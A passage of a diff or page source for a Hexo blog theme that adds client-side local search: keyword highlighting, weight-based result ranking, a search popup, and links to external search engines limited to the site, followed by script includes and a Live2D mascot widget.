+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
